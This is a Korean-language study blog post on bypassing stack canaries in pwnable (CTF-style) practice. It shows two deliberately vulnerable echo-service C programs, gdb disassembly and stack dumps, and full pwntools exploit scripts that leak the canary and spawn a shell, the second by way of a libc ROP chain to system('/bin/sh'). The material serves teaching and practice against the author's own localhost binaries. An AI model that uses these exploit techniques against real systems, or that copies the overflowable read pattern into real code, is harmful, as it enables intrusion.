---
layout: post
title: "Pwnable Canary Study"
date: 2018-08-26 23:55:00 -0400
categories: pwnable
---

메모리 보호기법중에서 잘 알려진 카나리(Canary)에 대해서 이야기해보려 한다. 먼저 카나리가 무엇인지 이야기하고 직접 만든 문제를 해결하며 우회하는 방법에 대해 알아보도록 하겠다.

### Stack Canary?
일반적으로 Buffer Overflow 공격 시, SFP와 RET주소를 덮어씌워 공격자가 원하는 흐름대로 프로그램이 실행된다. 이때, 덮어씌워지는 것을 보호하기위해 스택에 할당되는 변수와 SFP, RET 사이에 특정한 값들을 추가한다. 이를 통해 카나리값의 변조 유무를 판단하여 버퍼 오버플로우를 탐지하는 것을 Canary라 한다. 

### Echo_Service1 (예제)
~~~c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void echo_service(){
    write(0, "====== ECHO SERVICE =====\n", 27);
    write(0, "Input Echo String: ", 20);
}

void shell(){
    system("/bin/sh");
}

int main() {
    char buf[256];
    int i;
    for(i=0;i<2;i++){
        echo_service();
        read(0, buf, 1000);
        write(0, buf, strlen(buf));
    }
    return 0;
}
~~~

256bytes 크기의 buf 변수를 선언하고 사용자로부터 2번의 입력을 받고 입력한 문자열을 다시 출력하는 프로그램이다. 웬만하여 컴파일할때, 따로 옵션을 주지않아도 카나리는 자동으로 추가된다. 

~~~asm
gdb-peda$ pdisas main
Dump of assembler code for function main:
   0x00000000004006a6 <+0>:	push   rbp
   0x00000000004006a7 <+1>:	mov    rbp,rsp
   0x00000000004006aa <+4>:	sub    rsp,0x120
   0x00000000004006b1 <+11>:	mov    rax,QWORD PTR fs:0x28
   0x00000000004006ba <+20>:	mov    QWORD PTR [rbp-0x8],rax
   0x00000000004006be <+24>:	xor    eax,eax
   0x00000000004006c0 <+26>:	mov    DWORD PTR [rbp-0x114],0x0
   0x00000000004006ca <+36>:	jmp    0x40071c <main+118>
   0x00000000004006cc <+38>:	mov    eax,0x0
   0x00000000004006d1 <+43>:	call   0x400666 <echo_service>
   0x00000000004006d6 <+48>:	lea    rax,[rbp-0x110]
   0x00000000004006dd <+55>:	mov    edx,0x3e8
   0x00000000004006e2 <+60>:	mov    rsi,rax
   0x00000000004006e5 <+63>:	mov    edi,0x0
   0x00000000004006ea <+68>:	call   0x400540 <read@plt>
   0x00000000004006ef <+73>:	lea    rax,[rbp-0x110]
   0x00000000004006f6 <+80>:	mov    rdi,rax
   0x00000000004006f9 <+83>:	call   0x400510 <strlen@plt>
   0x00000000004006fe <+88>:	mov    rdx,rax
   0x0000000000400701 <+91>:	lea    rax,[rbp-0x110]
   0x0000000000400708 <+98>:	mov    rsi,rax
   0x000000000040070b <+101>:	mov    edi,0x0
   0x0000000000400710 <+106>:	call   0x400500 <write@plt>
   0x0000000000400715 <+111>:	add    DWORD PTR [rbp-0x114],0x1
   0x000000000040071c <+118>:	cmp    DWORD PTR [rbp-0x114],0x1
   0x0000000000400723 <+125>:	jle    0x4006cc <main+38>
   0x0000000000400725 <+127>:	mov    eax,0x0
   0x000000000040072a <+132>:	mov    rcx,QWORD PTR [rbp-0x8]
   0x000000000040072e <+136>:	xor    rcx,QWORD PTR fs:0x28
   0x0000000000400737 <+145>:	je     0x40073e <main+152>
   0x0000000000400739 <+147>:	call   0x400520 <__stack_chk_fail@plt>
   0x000000000040073e <+152>:	leave
   0x000000000040073f <+153>:	ret
End of assembler dump.
gdb-peda$
~~~

보면 main+11뿐에서 fs:0x28에서 canary 값을 가져와 rax에 저장하고 main+147에서 stack_chk_fail 함수를 통해 카나리 값이 변조되었는지 검사한다. 브포를 걸고 확인해보자.

~~~gdb
Breakpoint 1, 0x00000000004006b1 in main ()
gdb-peda$ n
[----------------------------------registers-----------------------------------]
RAX: 0x2dfb6ebdb5396f00	//Canary Value
RBX: 0x0
RCX: 0x0
RDX: 0x7fffffffe508 --> 0x7fffffffe74b ("XDG_SESSION_ID=10383")
RSI: 0x7fffffffe4f8 --> 0x7fffffffe710 ("/home/leehahoon/leehahoon_pwn/echo_service/1/echo_service1")
...
~~~

그렇다면 어떻게 스택 카나리 보호기법을 우회할 수 있을까. 여러 방법이 있겠지만 가장 대표적인 방법은 카나리의 특성을 이용하는 것이다. 카나리는 끝의 값에 무조건 NULL값이 붙는다. 그리고 대부분의 문자열 출력함수들은 NULL값이 나올때까지 출력 한다. 그 말은 위의 echo_service 예제에서 buf 변수를 다 덮어쓰고 카나리의 \x00까지 덮어씌우면 카나리값을 추출(Leak)하여 버퍼 오버플로우 공격을 성공할 수 있다.

gdb를 통해 분석을 하다보면 264bytes 까지가 변수이고 265bytes 부터는 카나리값이다. 
~~~gdb
gdb-peda$
...
0x7fffffffe3e0:	0x4141414141414141	0x4141414141414141
0x7fffffffe3f0:	0x4141414141414141	0x4141414141414141
0x7fffffffe400:	0x4141414141414141	0x235ab54b32cba80a
0x7fffffffe410:	0x0000000000400740	0x00007ffff7a2d830
...
~~~
read() 함수에서 A를 264개 넣고 스택을 확인한 모습이다. 카나리값의 마지막이 \x00이 아닌 \x0a인 이유는 A를 입력하며 엔터키가 같이 인식되었기 때문이다. 그렇다면 nc 서버로 실제 대회처럼 문제를 연결하고 카나리를 leak 해보도록 하겠다.

~~~python
from pwn import *
context.log_level = 'debug'

#r = process('./echo_service1')
r = remote('localhost', 1155)

r.recvuntil("Input Echo String: ")
r.send('A'*265)
r.recvuntil('A'*265)
canary = u64("\x00" + r.recv(7))
log.info(hex(canary))
~~~

이를 통해 카나리값을 알 수 있고, 이제 공격코드를 작성하면 된다. 쉽게 쉘을 획득하기위해 shell() 함수를 만들어 놓았다. 따라서 ret 주소를 shell() 함수로 덮어씌우면 쉘을 획득할 수 있을 것이다. 페이로드는 다음과 같을 것이다.

payload = [Dummy 264bytes] [Canary 8bytes] [SFP 8bytes] [RET 8Bytes (shell address)]

~~~python
from pwn import *
context.log_level = 'debug'

#r = process('./echo_service1')
r = remote('localhost', 1155)

r.recvuntil("Input Echo String: ")
r.send('A'*265)
r.recvuntil('A'*265)
canary = u64("\x00" + r.recv(7))
log.info(hex(canary))

payload = "A"*264
payload += p64(canary)
payload += "B"*8
payload += p64(0x400695)

r.recvuntil("Input Echo String: ")
r.send(payload)
r.interactive()
~~~

지금까지 이용한 방법 말고도 ROP를 이용하여 메모리값을 출력하거나 fork() 함수를 이용할 때, 카나리값은 항상 같으므로 브루트포싱하는 방법 등 여러가지가 존재할 수 있다.

그리고 위의 예제는 편의를 위해 shell() 함수를 만들어 놓았지만 ROP를 통해 문제를 해결할 수 있는 예제도 준비했다. 심심할 때 풀어보면 좋을 것 같다.

### Echo_Service2 (예제)
~~~c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dlfcn.h>

void echo_service(){
    write(0, "====== ECHO SERVICE =====\n", 27);
    write(0, "Input Echo String: ", 20);
}

void print_system(){
    void * handle;
    char system_addr[100];
    handle = dlopen("./libc.so.6", 1);
    sprintf(system_addr, "system : %p\n", dlsym(handle, "system"));
    write(0, system_addr, 100);
}

int main() {
    char buf[256];
    int i;
    print_system();
    for(i=0;i<2;i++){
        echo_service();
        read(0, buf, 1000);
        write(0, buf, strlen(buf));
    }
    return 0;
}
~~~

echo_service2 공격코드
~~~python
from pwn import *
context.log_level = 'debug'

r = process('./echo_service2')
#r = remote('localhost', 1515)

r.recv(9)
a = r.recv(14)
system_addr = int(a, 16)
r.recvuntil("Input Echo String: ")
log.info("system : 0x%x" % system_addr)
r.send('A'*265)
r.recvuntil('A'*265)
canary = u64("\x00" + r.recv(7))
log.info('canary: 0x%x' % canary)

binsh_offset = 0x18cd57
system_offset = 0x45390
pop_rdi = 0x0003b589

libc_addr = system_addr - system_offset
binsh_addr = libc_addr + binsh_offset
pop_rdi_addr = libc_addr + pop_rdi

log.info('libc : 0x%x' % libc_addr)
log.info('/bin/sh : 0x%x' % binsh_addr)
log.info('pop rdi; ret : 0x%x' % pop_rdi_addr)

payload = "A"*264
payload += p64(canary)
payload += "B"*8
payload += p64(pop_rdi_addr)
payload += p64(binsh_addr)
payload += p64(system_addr)

r.recvuntil("Input Echo String: ")
r.send(payload)
r.interactive()
~~~